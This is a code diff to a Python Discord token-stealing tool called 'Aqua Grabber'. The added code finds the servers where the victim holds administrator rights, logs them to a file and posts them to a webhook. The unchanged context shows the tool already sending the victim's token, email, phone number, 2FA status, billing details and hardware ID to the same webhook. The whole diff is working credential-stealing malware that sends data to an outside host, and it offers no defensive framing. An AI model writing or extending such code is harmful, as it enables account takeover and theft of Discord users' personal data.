@@ -182,7 +182,12 @@ def getDcToken():
         def getGuilds():
             NumberOfServer = 0
             for guild in guilds:
-                # gonna continue here later
+                if guild['permissions'] == '562949953421311':
+                    print("Admin In Server: " + guild['name'])
+                    with open(f"{Aqua}/Info/guilds.txt", "a") as f:
+                        f.write(str(guild['name'] + "\n"))
+                else:
+                    admin = False
                 NumberOfServer = NumberOfServer + 1
             return f"\n:floppy_disk: Victim Is In `{NumberOfServer}` Discord Guilds"
 
@@ -202,7 +207,8 @@ def getDcToken():
             f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.png"
         webhook.content = f'```{user} | {username} | HWID: {get_HWID()}```'
         webhook.add_embed(embed)
-        embed.set_title(f"<a:Lightblue_Verification:1018036944946602025>  Discord Info  <a:Lightblue_Verification:1018036944946602025>\n\nUsername : `{username}`")
+        embed.set_title(
+            f"<a:Lightblue_Verification:1018036944946602025>  Discord Info  <a:Lightblue_Verification:1018036944946602025>\n\nUsername : `{username}`")
         embed.set_image(avatar)
         embed.set_description(
             f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Aqua-Grabber)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
@@ -277,6 +283,20 @@ def getDcToken():
                             getUserData(i)
                         except:
                             print("Token Invalid")
+        with open(f"{Aqua}/Info/guilds.txt", "r") as y:
+            Lines = y.readlines()
+            webhook.content = f'```{user} | Admin Servers | HWID: {get_HWID()}```'
+            webhook.add_embed(embed)
+            embed.set_title(
+                f"<a:Lightblue_Verification:1018036944946602025>  Discord Info  <a:Lightblue_Verification:1018036944946602025>")
+            string_list = [str(element) for element in Lines]
+            delimiter = "\n"
+            result_string = delimiter.join(string_list).strip("\n")
+            embed.set_description(f"**Admin In Servers:** \n\n `{result_string}`")
+            embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & Aqualt | Grabbed By Aqua 💦")
+            webhook.execute()
+            webhook.remove_files()
+            webhook.remove_embeds()
 
     main_tokens()
 
